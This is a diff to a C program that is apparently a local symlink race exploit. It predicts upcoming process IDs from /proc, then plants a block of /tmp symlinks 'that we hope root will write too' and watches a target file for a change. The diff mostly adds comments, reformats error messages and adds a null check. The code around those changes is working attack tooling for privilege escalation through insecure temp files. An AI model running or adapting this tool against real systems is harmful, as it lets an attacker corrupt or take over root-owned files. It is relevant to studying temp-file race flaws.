@@ -50,11 +50,14 @@ main (int argc, char **argv)
     start_time[26], *buffer, *s;
   struct stat buf;
   time_t t_time_watch, t_time;
+  //Allow users to ctrl + C we clean up the /tmp files
 
   signal (SIGTERM, sigterm);
   signal (SIGINT, sigterm);
   signal (SIGHUP, sigterm);
-  //latest pid read from PROC + 1 
+
+  //Latest pid read from PROC add one to being the start of our for loop.
+
   from = (get_latest_pid ()) + 1;
 
   if (argc < 4)
@@ -102,7 +105,7 @@ main (int argc, char **argv)
   i = stat (dest_name, &buf);
   if (i < 0)
     {
-      printf ("ERROR with stat() on %s", dest_name);
+      printf ("\n[-] ERROR with stat() on %s!\n", dest_name);
       return (-1);
     }
 
@@ -110,10 +113,15 @@ main (int argc, char **argv)
   snprintf (start_time, 25, "%s", ctime (&t_time));	//truncate the \n from the timestamp
 
   t_time_watch = buf.st_mtim.tv_sec;
+
   //Create our block of symlinks that we hope root will write too.
+  //parse out the format of our /tmp file. In some cases the file may have the pid in the middle
+  //or mixed in with something else.
+
   printf ("[+] Symlinking ");
   buffer = from_name;
-  s = strsep (&buffer, "#");
+  s = strsep (&buffer, "#");  //The # delimiter tells us where in the file name the pid is.
+
   for (x = from; x < to; x++)
     {
       snprintf (tmp_name, 256, "%s%d%s", s, x, buffer);
@@ -145,7 +153,7 @@ main (int argc, char **argv)
       if (pid >= to)
 	{
 	  printf
-	    ("[-] Failed: The next pid %d will be past our largest predicted pid in /tmp links\ntry a larger number of links for busier systems.\n",
+	    ("\n\n[-] Failed: The next pid %d will be past our largest predicted pid in /tmp links\ntry a larger number of links for busier systems.\n",
 	     pid);
 	  unlink_files (start);
 	  exit (1);
@@ -169,7 +177,8 @@ main (int argc, char **argv)
 
 int
 get_latest_pid (void)
-{
+{ //Read the PROC directory to look for the latest pid to start our loop from.
+  //do this in a way where we don't spawn processes ourselves.
   DIR *dirp;
   struct dirent *direntp;
   int x = 0, array[MAXSIZE];
@@ -188,7 +197,7 @@ get_latest_pid (void)
 
 int
 scan_big (int *a, int n)
-{
+{ //sort out the largest integer in an array.
   int big = 0, x;
   big = a[0];
   for (x = 0; x < n; x++)
@@ -201,7 +210,7 @@ scan_big (int *a, int n)
 
 void
 unlink_files (files * fstruc)
-{
+{ //Delete symlinks using our linked list as filename storage.
   files *tmp;
   tmp = fstruc;
   fstruc = fstruc->next;
@@ -221,8 +230,9 @@ unlink_files (files * fstruc)
 
 static void
 sigterm (int sig)
-{
+{ //Our Signal Handler.  Delete any symlinks we've created.
   fprintf (stderr, "\n[+] Signal %d received. Exiting...\n", sig);
+  if (start) 
   unlink_files (start);
   exit (EXIT_SUCCESS);
 }
@@ -231,6 +241,7 @@ sigterm (int sig)
 char *
 strsep (char **stringp, const char *delim)
 {
+  /*#Taken from the GNU .c library code.*/
   char *s;
   const char *spanp;
   int c, sc;
